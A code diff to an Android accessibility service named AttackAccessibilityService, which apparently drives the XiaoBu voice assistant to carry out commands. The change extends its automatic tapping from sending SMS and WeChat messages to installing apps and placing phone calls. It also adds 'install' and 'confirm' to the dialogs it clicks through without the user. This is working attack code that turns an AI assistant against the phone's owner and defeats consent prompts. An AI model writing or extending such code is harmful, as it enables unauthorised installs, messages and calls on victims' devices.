@@ -64,18 +64,17 @@ public class AttackAccessibilityService extends AccessibilityService {
             busy = true;
             final String cmd = p;
 
-            // 先强制小布回前台(防止上次攻击后跳到其他App)
-            forceXiaoBuForeground();
-
-            // 判断是否需要二次点击(SMS/微信)
-            boolean needSecondClick = cmd.contains("发送信息") || cmd.contains("发微信");
+            // 判断是否需要二次点击
+            boolean needSecondClick = cmd.contains("发短信") || cmd.contains("发微信")
+                || cmd.contains("安装") || cmd.contains("拨打电话");
 
             h.postDelayed(() -> {
                 clickSend();  // 点击小布发送按钮
 
                 if (needSecondClick) {
                     // SMS/微信: 等目标App打开后点击其发送按钮
-                    int delay = cmd.contains("发微信") ? 10000 : 3500;
+                    int delay = cmd.contains("发微信") ? 10000
+                        : cmd.contains("安装") ? 10000 : 3500;
                     h.postDelayed(() -> {
                         clickSendInTargetApp();
                         h.postDelayed(() -> {
@@ -91,20 +90,6 @@ public class AttackAccessibilityService extends AccessibilityService {
                 }
             }, 2000);
         } catch (Exception e) {}
-    }
-
-    /** 强制小布回到前台 */
-    private void forceXiaoBuForeground() {
-        try {
-            android.content.Intent i = new android.content.Intent(android.content.Intent.ACTION_MAIN);
-            i.setComponent(new android.content.ComponentName(XB, XB + ".launcher.SpeechAssistMainActivity"));
-            i.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK
-                | android.content.Intent.FLAG_ACTIVITY_CLEAR_TOP);
-            startActivity(i);
-            Log.i(TAG, "📱 强制小布前台");
-        } catch (Exception e) {
-            Log.e(TAG, "前台失败: " + e.getMessage());
-        }
     }
 
     private void clickSend() {
@@ -131,13 +116,15 @@ public class AttackAccessibilityService extends AccessibilityService {
         Log.i(TAG, "搜索目标App发送按钮, 当前: " + pkg);
 
         // 先处理弹窗
-        clickIfExists(root, new String[]{"允许", "继续", "确定", "我知道了"});
+        clickIfExists(root, new String[]{"允许", "继续", "确定", "我知道了", "安装", "确认"});
 
-        // 尝试找到可点击的发送按钮(遍历所有节点)
+        // 找到可点击的发送/安装按钮
         if (clickAllClickableContaining(root, "发送") ||
             clickAllClickableContaining(root, "send") ||
-            clickAllClickableContaining(root, "Send")) {
-            Log.i(TAG, "✅ 找到可点击发送");
+            clickAllClickableContaining(root, "Send") ||
+            clickAllClickableContaining(root, "安装") ||
+            clickAllClickableContaining(root, "确认")) {
+            Log.i(TAG, "✅ 找到可点击按钮");
             root.recycle();
             return true;
         }
